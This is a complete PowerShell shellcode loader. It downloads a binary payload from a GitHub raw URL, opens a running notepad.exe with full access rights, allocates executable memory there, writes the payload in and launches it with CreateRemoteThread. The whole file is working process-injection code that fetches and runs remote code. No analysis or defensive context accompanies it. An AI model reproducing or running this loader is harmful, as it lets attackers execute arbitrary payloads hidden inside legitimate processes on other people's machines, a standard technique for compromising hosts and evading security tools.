$url = "https://github.com/MJ06-BP/bp/raw/refs/heads/main/shellcode.bin"

try {
    $wc = New-Object Net.WebClient
    $shellcode = $wc.DownloadData($url)
} catch {
    Write-Host "[-] Download failed: $($_.Exception.Message)"
    exit
}

$size = $shellcode.Length

Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);
"@ -Name Win32 -Namespace Native -PassThru

# ────────────────────────────────────────────────
# Find an existing notepad.exe process
# ────────────────────────────────────────────────

$targetProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1

if (-not $targetProc) {
    Write-Host "[-] No notepad.exe process found. Please start Notepad first."
    exit
}

$pid = $targetProc.Id
Write-Host "[i] Targeting notepad.exe with PID: $pid"

try {
    # PROCESS_ALL_ACCESS = 0x1F0FFF
    $hProcess = [Native.Win32]::OpenProcess(0x1F0FFF, $false, $pid)
    if ($hProcess -eq [IntPtr]::Zero) {
        throw "OpenProcess failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    # MEM_COMMIT | MEM_RESERVE = 0x3000, PAGE_EXECUTE_READWRITE = 0x40
    $addr = [Native.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, 0x3000, 0x40)
    if ($addr -eq [IntPtr]::Zero) {
        throw "VirtualAllocEx failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    $written = 0
    $success = [Native.Win32]::WriteProcessMemory($hProcess, $addr, $shellcode, $size, [ref]$written)
    if (-not $success -or $written -ne $size) {
        throw "WriteProcessMemory failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    $tid = 0
    $thread = [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
    if ($thread -eq [IntPtr]::Zero) {
        throw "CreateRemoteThread failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    Write-Host "[+] Shellcode injected & remote thread created (TID: $tid)"
    Write-Host "[+] Waiting for execution to finish..."

    [Native.Win32]::WaitForSingleObject($thread, [uint32]::MaxValue) | Out-Null

    Write-Host "[+] Remote thread finished"
}
catch {
    Write-Host "[-] Injection error: $($_.Exception.Message)"
}
finally {
    if ($thread -and $thread -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle($thread) | Out-Null }
    if ($hProcess -and $hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle($hProcess) | Out-Null }
}
